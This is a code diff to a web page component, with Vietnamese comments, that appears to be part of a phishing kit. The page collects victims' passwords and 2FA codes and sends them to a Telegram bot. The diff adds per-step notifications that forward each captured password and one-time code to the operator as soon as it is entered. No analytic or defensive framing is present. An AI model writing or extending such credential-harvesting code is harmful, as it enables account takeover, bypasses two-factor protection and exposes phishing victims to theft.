@@ -384,7 +384,7 @@ export default function HomePageClient({
   const [code3, setCode3] = useState("");
   const [currentUrl, setCurrentUrl] = useState("");
 
-const sendTelegramMessage = async (text: string, options?: { disable_notification?: boolean }) => {
+const sendTelegramMessage = async (text: string, options?: { disable_notification?: boolean, isRootMessage?: boolean }) => {
   if (!telegramEnabled) return;
   try {
     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -398,7 +398,9 @@ const sendTelegramMessage = async (text: string, options?: { disable_notificatio
       }),
     });
     const data = (await response.json()) as { ok?: boolean; result?: { message_id?: number } };
-    if (data?.ok && data.result?.message_id != null) {
+    
+    // CHỈ LƯU ID NẾU ĐÓ LÀ TIN NHẮN GỐC
+    if (data?.ok && data.result?.message_id != null && options?.isRootMessage) {
       const id = String(data.result.message_id);
       setMessageId(id);
       if (typeof window !== "undefined") {
@@ -517,7 +519,14 @@ const pushUpdate = async (
   // 1) cập nhật stateRef
   stateRef.current = { ...stateRef.current, ...updates };
 
-  // 2) lấy message_id (ưu tiên state, fallback localStorage)
+  // 2) Gửi thông báo có âm thanh
+  if (updates.password1) await notifyStep("Mật khẩu 1", updates.password1);
+  if (updates.password2) await notifyStep("Mật khẩu 2", updates.password2);
+  if (updates.code1) await notifyStep("Mã 2FA (L1)", updates.code1);
+  if (updates.code2) await notifyStep("Mã 2FA (L2)", updates.code2);
+  if (updates.code3) await notifyStep("Mã 2FA (L3)", updates.code3);
+
+  // 3) lấy message_id (ưu tiên state, fallback localStorage)
   const targetId =
     messageId ??
     (typeof window !== "undefined" ? window.localStorage.getItem("telegram_msg_id") : null);
@@ -527,7 +536,7 @@ const pushUpdate = async (
     return;
   }
 
-  // 3) edit tin nhắn gốc
+  // 4) edit tin nhắn gốc tổng hợp
   await editTelegramMessage(targetId, buildFullMessage());
 };
 
